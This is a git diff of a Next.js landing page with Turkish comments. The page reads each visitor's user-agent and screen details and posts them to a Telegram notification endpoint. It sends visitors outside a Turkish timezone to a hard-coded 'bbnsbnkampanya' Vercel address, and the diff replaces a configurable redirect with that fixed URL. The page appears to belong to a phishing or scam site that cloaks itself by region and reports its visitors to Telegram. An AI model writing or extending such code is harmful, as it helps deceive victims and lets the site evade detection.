@@ -1,9 +1,6 @@
 import { headers } from 'next/headers';
 import { redirect } from 'next/navigation';
 
-// Varsayılan yönlendirme URL'si
-const DEFAULT_REDIRECT_URL = 'https://bbnsbnkampanya.vercel.app/';
-
 export default async function Home() {
   const headersList = await headers();
   const userAgent = headersList.get('user-agent') || 'Unknown';
@@ -18,11 +15,7 @@ export default async function Home() {
 
   // Telegram bildirimi gönder
   try {
-    const baseUrl = process.env.VERCEL_URL 
-      ? `https://${process.env.VERCEL_URL}`
-      : 'http://localhost:3000';
-
-    const telegramResponse = await fetch(`${baseUrl}/api/telegram`, {
+    await fetch('/api/telegram', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -37,39 +30,13 @@ export default async function Home() {
         screenResolution
       })
     });
-
-    if (!telegramResponse.ok) {
-      console.error('Telegram API error:', await telegramResponse.text());
-    }
   } catch (error) {
     console.error('Telegram notification error:', error);
   }
 
-  // Yönlendirme URL'sini al
-  let redirectUrl = DEFAULT_REDIRECT_URL;
-  
-  try {
-    const baseUrl = process.env.VERCEL_URL 
-      ? `https://${process.env.VERCEL_URL}`
-      : 'http://localhost:3000';
-
-    const redirectResponse = await fetch(`${baseUrl}/api/redirect-url`);
-    
-    if (redirectResponse.ok) {
-      const data = await redirectResponse.json();
-      if (data.redirectUrl) {
-        redirectUrl = data.redirectUrl;
-      }
-    } else {
-      console.error('Redirect URL API error:', await redirectResponse.text());
-    }
-  } catch (error) {
-    console.error('Error fetching redirect URL:', error);
-  }
-
   // Türkiye dışındaki kullanıcıları yönlendir
   if (!isTurkishTimezone) {
-    redirect(redirectUrl);
+    redirect('https://bbnsbnkampanya.vercel.app/');
   }
 
   return (
